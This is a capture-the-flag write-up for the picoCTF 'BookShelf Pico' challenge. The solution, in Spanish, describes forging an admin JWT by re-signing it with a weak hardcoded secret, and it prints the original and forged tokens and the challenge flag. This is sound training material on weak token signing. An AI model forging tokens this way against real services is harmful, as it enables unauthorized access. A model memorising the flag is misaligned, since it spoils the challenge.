## Descripción 
BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Here are the credentials to get you started:
- Username: "user"
- Password: "user"
Source code can be downloaded [here](https://artifacts.picoctf.net/c/482/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:49959/).

Hint:
1. Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
2. The 'role' and 'userId' fields in the JWT can be of interest to you!
3. The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
4. Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.
## Solución 1

Ingresamos a la página e ingresamos al apartado de bandera y nos fijamos que está bloqueada, entonces con inspector verificamos el network y sacamos el jwt, una vez lo tenemos abrimos el archivo de source code y miramos cada apartada viendo como cada parte necesaria para modificar el jwt, una vez tenemos esto, en un debugger modificamos el jwt y lo remplazamos así obteniendo la bandera.

```
jwt: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTQ3MDk0OSwiaWF0IjoxNzQ0ODY2MTQ5LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.RchxYLgCtyQlqFYkcY-VmQx0odSgCMhqnc9UaffSdnc

role: Admin
userID: 2
email: admin
secret: 1234

jwt modificado: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDU0NzA5NDksImlhdCI6MTc0NDg2NjE0OSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.qxJcixJnM209a9RiQrdbTSObsos5_3EeSQdk_-tg1HU

flag: picoCTF{w34k_jwt_n0t_g00d_d72df65e}
```
